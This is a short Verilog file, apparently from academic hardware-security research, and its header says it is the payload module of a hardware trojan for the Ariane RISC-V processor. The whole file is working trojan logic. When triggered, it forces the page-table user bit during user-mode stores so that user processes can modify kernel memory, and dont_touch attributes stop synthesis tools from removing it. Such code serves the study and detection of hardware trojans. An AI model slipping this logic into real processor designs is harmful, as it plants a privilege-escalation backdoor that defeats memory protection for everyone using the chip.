// Author: Athanasios Moschos, Georgia Tech
// Date: 05/21/2024
// Description: Payload module of a hardware trojan, that when enabled, allows the modification of the kernel address space from a user processes

(* DONT_TOUCH = "true|yes" *)
module trj_pay import ariane_pkg::*; (
  (* dont_touch = "true" *) input wire clk ,			// Clock signal
  (* dont_touch = "true" *) input wire pte_u_i ,   		// U bit of PTE - U=1 --> disables 'daccess_er' and so 'lsu_exception_o'
  (* dont_touch = "true" *) input wire trigger_i ,  		// Triggering input signal
  (* dont_touch = "true" *) output wire pte_u_mod_o , 		// Modified U bit of PTE
  (* dont_touch = "true" *) input wire dtlb_hit_i ,		// DTLB hit bit - translated address inside the Data Translation Lookaside Buffer
  (* dont_touch = "true" *) input wire is_store_i ,		// The command that requests address translation is a STORE
  (* dont_touch = "true" *) input wire priv_0_i ,		// LSBit of Privilege Level Signal
  (* dont_touch = "true" *) input wire ld_st_priv_0_i		// LSBit of Load/Store Privilege Level Signal
);
  wire enable_2_cycle, edge_pos, store_hit;
  reg Q_out1, Q_out2, Q_out3;
  
  assign store_hit = dtlb_hit_i && is_store_i; 
  assign pte_u_mod_o = (trigger_i && enable_2_cycle) ? 1'b1  : pte_u_i;
  assign edge_pos = (!Q_out1 && store_hit);  
  assign enable_2_cycle = Q_out1 && (Q_out2 || Q_out3);

  always @(posedge clk) begin
    if (Q_out3)
      Q_out1 <= 1'b0;
    else
      Q_out1 <= (store_hit) && (!priv_0_i && !ld_st_priv_0_i);
  end  

  always @(posedge clk) begin
    if (Q_out3)
      Q_out2 <= 1'b0;
    else
      Q_out2 <= edge_pos;
  end
  
  always @(posedge clk) begin
    if (Q_out3)
      Q_out3 <= 1'b0;
    else
      Q_out3 <= Q_out2;
  end
  
endmodule

